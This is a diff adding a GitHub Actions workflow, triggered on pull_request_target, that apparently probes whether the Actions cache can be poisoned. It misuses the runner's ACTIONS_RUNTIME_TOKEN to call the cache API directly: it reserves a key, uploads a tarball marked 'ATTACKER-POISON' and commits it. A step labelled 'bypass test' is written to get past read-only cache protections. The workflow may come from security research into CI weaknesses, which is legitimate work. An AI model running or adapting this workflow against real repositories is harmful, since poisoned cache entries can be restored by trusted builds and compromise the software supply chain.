@@ -1,0 +1,53 @@
+name: prt-probe
+on: pull_request_target
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: env
+        run: |
+          echo "MODE=[${ACTIONS_CACHE_MODE:-unset}]"
+          echo "CACHE_URL=[${ACTIONS_CACHE_URL:-unset}]"
+          echo "RESULTS_URL=[${ACTIONS_RESULTS_URL:-unset}]"
+          echo "TOKEN_LEN=${#ACTIONS_RUNTIME_TOKEN}"
+      - name: baseline actions/cache save (expect read-only)
+        uses: actions/cache@v4
+        with:
+          path: probe-dir
+          key: baseline-${{ github.run_id }}
+      - name: raw api write (bypass test)
+        run: |
+          set -e
+          BASE="${ACTIONS_RESULTS_URL:-$ACTIONS_CACHE_URL}"
+          API="${BASE}_apis/artifactcache"
+          KEY="poison-probe"
+          VER="probe-v1"
+          mkdir -p probe-dir && echo "ATTACKER-POISON run=${{ github.run_id }} actor=${{ github.actor }}" > probe-dir/payload.txt
+          tar -czf /tmp/cache.tgz -C probe-dir .
+          SIZE=$(stat -c%s /tmp/cache.tgz)
+          echo "SIZE=$SIZE"
+          RES=$(curl -s -w '\n%{http_code}' -X POST "$API/caches" \
+            -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+            -H "Accept: application/json;api-version=6.0-preview.1" \
+            -H "Content-Type: application/json" \
+            -d "{\"key\":\"$KEY\",\"version\":\"$VER\"}")
+          echo "RESERVE_BODY=$(echo "$RES" | head -1)"
+          echo "RESERVE_CODE=$(echo "$RES" | tail -1)"
+          CID=$(echo "$RES" | head -1 | python3 -c "import json,sys; print(json.load(sys.stdin).get('cacheId',''))" 2>/dev/null || true)
+          echo "CID=$CID"
+          if [ -n "$CID" ]; then
+            UP=$(curl -s -o /dev/null -w '%{http_code}' -X PATCH "$API/caches/$CID" \
+              -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+              -H "Accept: application/json;api-version=6.0-preview.1" \
+              -H "Content-Type: application/octet-stream" \
+              -H "Content-Range: bytes 0-$((SIZE-1))/*" \
+              --data-binary @/tmp/cache.tgz)
+            echo "UPLOAD_CODE=$UP"
+            CM=$(curl -s -w '\n%{http_code}' -X POST "$API/caches/$CID" \
+              -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+              -H "Accept: application/json;api-version=6.0-preview.1" \
+              -H "Content-Type: application/json" \
+              -d "{\"size\":$SIZE}")
+            echo "COMMIT_BODY=$(echo "$CM" | head -1)"
+            echo "COMMIT_CODE=$(echo "$CM" | tail -1)"
+          fi
